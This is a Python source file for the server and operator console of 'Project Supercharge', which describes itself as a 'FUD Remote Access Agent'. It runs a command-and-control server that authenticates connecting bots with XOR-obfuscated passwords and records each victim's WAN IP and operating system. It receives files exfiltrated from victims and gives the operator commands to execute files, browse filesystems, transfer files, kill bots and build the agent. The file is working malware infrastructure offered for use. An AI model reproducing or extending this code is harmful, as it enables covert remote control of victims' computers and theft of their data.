import socket

import _thread

from colorama import Fore, Style

from .infodb import *

from .session import run_session

import configparser

from os import stat

from os import path

from .builder import create_agent

import os

import base64

from kernel.banner import pbanner

from .notif import notify


colorama.init()
BUFFER = 1024 
global client, addr
clients = []
oslist = []

iplist = []
wan_ip_list = []

isSession = False

infodb = configparser.ConfigParser()
settings = configparser.ConfigParser()

try:
    settings.read("supercharge.ini")
    server_settings = settings['server']
    bot_settings = settings['bot']
except Exception as e:
    print(str(e))
    exit(True)


def SendData(csocket, data):
    csocket = int(csocket)
    sockfd = clients[csocket]
    
    try:
        toSend = xor(data)
        sockfd.send(toSend.encode())
    except Exception as error:
        clients.remove(sockfd)
        print(Style.BRIGHT + "Error Occured : " + str(error))

def SendFData(csocket, data):
    csocket = int(csocket)
    sockfd = clients[csocket]
    
    try:
        sockfd.send(data.encode())
    except Exception as error:
        clients.remove(sockfd)
        print(Style.BRIGHT + "Error Occured : " + str(error))


def SendBytes(csocket, data):
    """ Binary File Content is sent without Encryption """ 
    csocket = int(csocket)
    sockfd = clients[csocket]
    
    try:
        sockfd.send(data)
    except Exception as error:
        clients.remove(sockfd)
        print(Style.BRIGHT + "Error Occured : " + str(error))


def clear():
    if(os.name == "nt"):
        os.system("cls")
    else:
        os.system("clear")

def botlist():
    return str(len(clients))

def botinfo():
    if(len(clients) > 0):
        for i in range(len(wan_ip_list)):                
            return UIReadInformation(wan_ip_list[i])
    else:
        return "-"

def AllBotNames():
    if(len(clients) > 0):
        for i in range(len(iplist)):                
            return BOTNAMEONLY(iplist[i])
    else:
        return "-"

def broadcast(data):
    try:
        ToSend = xor(data)
        for i in clients:
            i.send(ToSend.encode())
    except Exception as error:
        print(Style.BRIGHT + "Error Occured : " + str(error))
    



def Server():
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 1)
        server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 1)
        server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 5)

        def ReceiveThread(ip, port, csocket, wanip):
            def clearLists():
                try:
                    clients.remove(csocket)
                    iplist.remove(ip)
                    wan_ip_list.remove(wanip)
                except ValueError:
                    print("[+] Socket not in list.")

            while(True):
                try:
                    reply = csocket.recv(1024).decode()
                    if(not reply):
                        clearLists()
                        print(Style.BRIGHT + "BOT disconnected.")
                        print("Online Bots : " + str(len(clients)))
                        break
                    # Decrypt the data
                    response = xor(reply)
                    if(response.startswith("savethis")):
                        print("\n[+] Incoming file request..")
                        try:
                            f = response.split("=")
                            csocket.settimeout(10)
                            try:
                                with open(f[1], "wb") as received_file:
                                    data = csocket.recv(4096)
                                    print("[+] Downloading file '{fl}'".format(fl=f[1]))
                                    while(data):
                                        received_file.write(data)
                                        data = csocket.recv(4096)
                                        if not data:
                                            break
                            except:
                                received_file.close()
                                csocket.settimeout(None)
                                print("[+] Downloaded file '"+f[1] +"'.")
                                sa = stat(f[1])
                                print(
                                    "[+] Filename : {filename} | Size : {size} bytes | Saved : {fp}".format(
                                        filename = f[1],
                                        size = str(sa.st_size),
                                        fp = str(path.dirname(path.abspath(f[1])))
                                    )
                                )

                        except IndexError:
                            print("Error.")
                    else:
                        # if(isSession == True):
                        #print(str(response))
                        # else:
                        print(Style.RESET_ALL + "\n["+Fore.LIGHTGREEN_EX + Style.BRIGHT + "+"+ Style.RESET_ALL + "] "+ip+":"+port+" - " + str(response), flush=True)        
                except UnicodeDecodeError as ude:
                    print(Style.BRIGHT + "Unicode Decode error : " + str(ude))
                except UnicodeEncodeError as eEe:
                    print(Style.BRIGHT + "Unicode Encode error : " + str(eEe))
                except ConnectionAbortedError as cAe:
                    # cAe : Connection Aborted Error :v
                    clearLists()
                    print(Style.BRIGHT + "Error Occured : " + str(cAe))
                    print("Online Bots : " + str(len(clients)))
                    break

                except ConnectionError as cE:
                    # cE : Connection Error :'v
                    clearLists()
                    print(Style.BRIGHT + "Error Occured : " + str(cE))
                    print("Online Bots : " + str(len(clients)))
                    break

                except ConnectionRefusedError as cRe:
                    # cRe : Connection Refused Error ;'v
                    clearLists()
                    print(Style.BRIGHT + "Error Occured : " + str(cRe))
                    print("Online Bots : " + str(len(clients)))
                    break

                except ConnectionResetError as cRetwo:
                    clearLists()
                    print(Style.BRIGHT + "Error Occured : " + str(cRetwo))
                    print("Online Bots : " + str(len(clients)))
                    break

                except socket.error as se:
                        # for sockfd in clients:
                        #     clients.remove(sockfd)
                        clearLists()
                        print(Style.BRIGHT + "Error Occured : " + str(se))
                        print("Online Bots : " + str(len(clients)))
                        break
                
                except Exception as recv_error:
                    clearLists()
                    print(Style.BRIGHT + "Error Occured : " + str(recv_error))
                    print("Online Bots : " + str(len(clients)))
                    break
            
        host = server_settings['host']
        port = int(server_settings['port'])

        try:
            server.bind((host, port))
        except Exception as i:
            raise i

        try:
            server.listen(5)
          #  print("Server running.")
        except KeyboardInterrupt:
            print(" Keyboard Interrupt, Exit.")
            exit()
        except Exception as errunknown:
            print(str(errunknown))

        while(True):
                
            client, addr = server.accept()
            clients.append(client)
            iplist.append(str(addr[0]))
            if(bot_settings['verbrose'] == "True"):
                print("[+] New connection from " + str(addr[0]) +":"+ str(addr[1]))
            try:
                pw = xor(bot_settings['password'])
                if(bot_settings['verbrose'] == "True"):
                    print("[+] Sending Password : " + bot_settings['password'] + " ("+pw + ")")
                client.send(pw.encode())
                
                client.settimeout(10)
                try:
                    # Set 10 seconds timeout to wait for client 
                    
                    pwInfo = client.recv(1024).decode()
                    if(pwInfo.startswith("INCORRENT PASSWORD.")):
                        print("[+] " + xor(pwInfo) + ". Password Rejected by Agent.")
                        clients.remove(client)
                        iplist.remove(str(addr[0]))
                        break
                except socket.timeout:
                    client.settimeout(None)
                    print("\n[+] Timed out, Client did not send a Response. Connection closed.")
                    print("\n[+] Kicked {ip}:{port}..".format(ip=str(addr[0]), port=str(addr[1])))
                    client.shutdown(socket.SHUT_RDWR)
                    client.close()
                    clients.remove(client)
                    iplist.remove(str(addr[0]))
                    break
                
                client.settimeout(None)
                if(bot_settings['verbrose'] == "True"):
                    print("[+] " + xor(pwInfo))
                # Receive Wan ip for file name
                client.send(xor("wanip").encode())
                Ewanip = client.recv(1024).decode()
                client.send(xor("os").encode())
                Eos = client.recv(1024).decode()
                wanip = xor(Ewanip)
                os = xor(Eos)
                wan_ip_list.append(wanip)
                oslist.append(os)
            except ConnectionResetError as cRe:
                print("--! ERROR : " + str(cRe) + ". Most likely password was rejected.")
                clients.remove(client)
                iplist.remove(str(addr[0]))
                
            filename = "bots/"+str(wanip)
            if(bot_settings['verbrose'] == "True"):
                print(Style.BRIGHT + "[+] Getting information.."+ Style.RESET_ALL) 
            SaveInformation(client, filename) 
            notify(str(addr[0]), str(addr[1]), str(len(clients)))
            # default
            print(Style.BRIGHT + Fore.LIGHTGREEN_EX + "[[ -> " + str(addr[0])+":"+str(addr[1])+ " <- has connected ]]" + Style.RESET_ALL)
            _thread.start_new_thread(ReceiveThread, (str(addr[0]), str(addr[1]), client, wanip,))

def console():

    def list_bots():
        print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "Online : " + colorama.Style.RESET_ALL + str(len(clients)))
        try:
            if(len(clients) > 0): 
                for i in range(len(iplist)):
                #    print("["+str(i)+"]: " + colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX + iplist[i] + colorama.Style.RESET_ALL)
                    print( Style.BRIGHT + Fore.WHITE + 
                        "[ SESSION ID "+str(i) +" ] : [ Connection -> "+iplist[i] + " ] [ WAN -> "+wan_ip_list[i] +" ] [ OPERATING SYSTEM : " + oslist[i] + " ]"
                        + Style.RESET_ALL)
        except Exception as stre:
            print("Error : " + str(stre))
                
        except FileNotFoundError:
            print("-[+] File not found!?")
        except IndexError:
            print("USAGE : transfer <filename> <remote filename> <text|binary> <cid>")
        except Exception as e:
            print("-[+] Error : " + str(e))
    
    _thread.start_new_thread(Server, ())
    while(True):
        
        try:
            current_time = datetime.datetime.now().strftime("%H:%M:%S")
            command = input(Style.BRIGHT + Fore.LIGHTBLUE_EX + "[" + str(current_time) + "]" + Fore.YELLOW + " supercharge" + Fore.LIGHTCYAN_EX + "> " + Style.RESET_ALL + Style.BRIGHT)
            args = command.split()
            if(command == "help"):
                print(Style.BRIGHT + Fore.LIGHTBLUE_EX + 
                    """
                    HELP 
                    -------------
                    ~ Console Commands :
                    ---------------------------
                    + list/sessions - List online clients.

                    + settings - View settings.
                    
                    + options - View options of loaded module.

                    + session - Interact with a Client.
                      - USAGE : session <session id>

                    + kill - Kill a connection.
                      - USAGE : kill <session id>
                    
                    + bytecheck - (Misc) Check the size of a string.
                      - (NOTE : This was added for cryptographic testing and is useless for a user. Useful for developer.)
                    
                    + botinfo - View information of a Connection BOT/Client.

                    + xor - (Misc) Encrypt a string to XOR.
                      - (NOTE : This was added for cryptographic testing.)

                    + banner - Print banner.

                    + build - Build the agent.

                    + exit - Exit.

                     ~ Session Commands :
                    ---------------------------

                    + botinfo - View Information.
                    
                    + msgbox - Send a messagebox.

                    + transfer - Transfer a file.
                    
                    + exec - Execute a file.

                    + browse - Browse the Filesystem.

                    + help - View more detailed commands.


                    Project Supercharge | FUD Remote Access Agent. 
                    Created by : Quantumcore (Fahad)
                    Github : https://github.com/quantumcore 
                    Official Repository : https://github.com/quantumcore/supercharge
                    Discord Server : https://discordapp.com/invite/8snh7nx

                    """ + Style.RESET_ALL
                )
            elif(command == "settings"):
                print(
                    Style.BRIGHT + Fore.YELLOW +  
                    "[+] TCP Server Host : " + server_settings['host'] + 
                    "\n[+] TCP Server Port : " + server_settings['port'] +
                    "\n[+] Print BOT INFO on connect : " + bot_settings['auto_print_bot_info'] + 
                    "\n[+] BOT Password : " + bot_settings['password'] 
                    + Style.RESET_ALL
                 )
            elif(command == "list" or command == "sessions"):
                list_bots()
            elif(command.startswith("session")):
                print(Style.RESET_ALL)
                s = command.split()
                try:
                    sid = int(s[1])
                    prmpt = Style.BRIGHT + Fore.LIGHTCYAN_EX + "supercharge"+Fore.LIGHTGREEN_EX+"("+Fore.LIGHTYELLOW_EX + wan_ip_list[sid]+ Fore.LIGHTGREEN_EX + ")"+Style.RESET_ALL + Style.BRIGHT + "$ " + Style.RESET_ALL
                    print("[+] Session opened for Client ID {id}.".format(id=str(sid)))
                    isSession = True
                    run_session(clients[sid],isSession, prmpt, sid, iplist[sid])
                    print("[+] Session closed for Client ID {id}.".format(id=str(sid)))
                except IndexError:
                    print("CID {s} not online.".format(s=s[1]))
                except Exception as es:
                    print("Error! ("+str(es)+")")
                    
            elif(command == "bytecheck"):
                message = input("Input : ")
                msgsize = str(len(message)) + " Bytes."
                if(len(message) > 100):
                    print("\nYour Input : " + message + "\nSize : " + msgsize + Style.BRIGHT + Fore.RED+"\n(Not Eligible for Password)" + Style.RESET_ALL)
                else:
                    print("\nYour Input : " + message + "\nSize : " + msgsize + Style.BRIGHT + Fore.GREEN+"\n(Eligible for Password)" + Style.RESET_ALL)
          

            elif(command.startswith("kill")):
                try:
                    cid = int(args[1])
                    SendData(cid, "kill")
                    clients[cid].shutdown(socket.SHUT_RDWR)
                    clients[cid].close()
                    
                except IndexError:
                    print("USAGE : kill <session id>")
            elif(command == "build"):
                create_agent()

            elif(command.startswith("botinfo")):
                try:
                    infoFor = iplist[int(args[1])]
                    ReadInformation(infoFor)
                except IndexError:  
                    print("-[+] BOT is not online!?")
                    print("-[+] Offline bot information is saved under bots/")
                    print("-[+] Can be viewed by Humans. :)")
    
            elif(command == "banner"):
                print(pbanner())
           
            elif(command == "xor"):
                l = input("> ")
                print("XOR Encrpytion/Decryption -")
                enc = xor(l)
                denc = xor(enc)
                print("[+] Encrypted : " + enc + " (Size : " + str(len(enc)) + " Bytes)")
                print("[+] Decrypted : " + denc +" (Size : " + str(len(denc)) + " Bytes)")
            
            elif(command.startswith("send")):
                try:
                    cid = args[1]
                    SendData(cid, args[2])
                except IndexError:
                    print("USAGE : send <id> <data>")

            
            elif(command == "exit"):
                if(len(clients) > 0):
                    print("[+] You have online bots? Kill the connections?")
                    yn = input("Your Desicion (y/N) : ").lower()
                    if(yn == "y"):
                        broadcast("kill")
                        print("[+] Disconnected everyone.")
                        exit(True)
                    else:
                        pass
                else:
                    exit(True)
                

        except KeyboardInterrupt:
            print(" = Interrupt. Type Exit to exit.")
            

